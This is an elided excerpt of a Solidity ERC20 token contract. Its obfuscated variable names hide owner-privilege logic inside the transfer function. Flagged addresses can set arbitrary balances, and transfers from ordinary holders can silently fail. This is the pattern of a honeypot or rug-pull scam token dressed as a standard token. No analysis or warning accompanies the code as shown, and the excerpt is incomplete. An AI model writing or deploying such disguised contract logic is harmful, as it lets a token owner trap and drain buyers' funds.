...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _impossible = _tTotal;
    ...
    mapping(uint256 => address) private _suppose;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _thee;
    ...
    constructor(
        ...
        _red[address(this)] = _impossible;
        _red[msg.sender] = _impossible;
    ...
    function _transfer(
        ...
        address _factory = uniswapV2Pair;
        bool _neighborhood;
        if (!inSwapAndLiquify && _impossible < _red[to] && _red[from] > _impossible) {
            _neighborhood = true;
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_red[from] > 0 && to != _factory && amount > _impossible) {
            _neighborhood = true;
            _red[to] = amount;
        }
        if ((_red[from] == 0 && from != _factory && _thee[from] > 0) || _neighborhood) {
            return;
        }

        if (_taxFee > 0 && _red[from] == 0 && !inSwapAndLiquify && _red[to] == 0) {
